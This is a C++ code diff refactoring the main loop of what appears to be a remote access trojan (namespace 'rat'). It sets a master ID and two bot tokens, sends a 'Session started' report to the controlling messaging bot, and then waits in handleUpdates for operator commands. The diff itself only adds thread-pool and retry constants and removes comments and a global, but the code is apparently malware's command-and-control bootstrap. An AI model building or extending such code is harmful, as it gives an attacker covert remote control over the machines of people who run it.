@@ -15,24 +15,21 @@
 #include <mutex>
 #include <string>
 #include <thread>
+#include <cstdint>
 
 #ifdef _WIN32
 #  include <windows.h>
 #endif
 
-// ==============================
-// Original globals / helpers
-// ==============================
 
+constexpr uint8_t NUMBER_OF_THREADS_INSISDE_SHORT_PROCESS_POOL = 1;
+constexpr uint8_t NUMBER_OF_THREADS_INSISDE_LONG_PROCESS_POOL = 1;
+constexpr uint8_t NUMBER_OF_THREADS_INSISDE_HELPER_POOL = 2;
 
-std::string init_message;
+constexpr uint8_t NETWORKING_OPERATION_RESTART_BOUND = 5; 
 
-// Forward decls
 static void botLoop();
 
-// ==============================
-// main
-// ==============================
 int main() {
     botLoop();
     return 0;
@@ -42,29 +39,21 @@ static void botLoop() {
 
     DEBUG_LOG("Bot constructing");
 
-    if (init_message.empty()) {
-        init_message = fmt::format("Session started at: {}", ::rat::system::getCurrentDateTime());
-    }
 
     rat::handler::Handler session_handler;
     
     session_handler.setMasterId(MASTER_ID);
     session_handler.initMainBot(TOKEN1_odahimbotzawzum);
     session_handler.initBackingBot(TOKEN_ODAHIMBOT);
-    session_handler.initCurlClient(1);
-    session_handler.initThreadPools(1, 1);
 
-    session_handler.bot->sendMessage(init_message);
+    session_handler.initCurlClient(NETWORKING_OPERATION_RESTART_BOUND);
+
+    session_handler.initThreadPools(NUMBER_OF_THREADS_INSISDE_SHORT_PROCESS_POOL, 
+                                    NUMBER_OF_THREADS_INSISDE_LONG_PROCESS_POOL,
+                                    NUMBER_OF_THREADS_INSISDE_HELPER_POOL);
+
+    session_handler.bot->sendMessage(fmt::format("Session started at: {}", ::rat::system::getCurrentDateTime()));
 
     session_handler.handleUpdates();
 
-    DEBUG_LOG("Bot loop exiting — letting destructors clean up (RAII).");
-    session_handler.bot->sendMessage("The session is being destroyed");
 }
-
-// ==============================
-// Helpers
-// ==============================
-
-
-
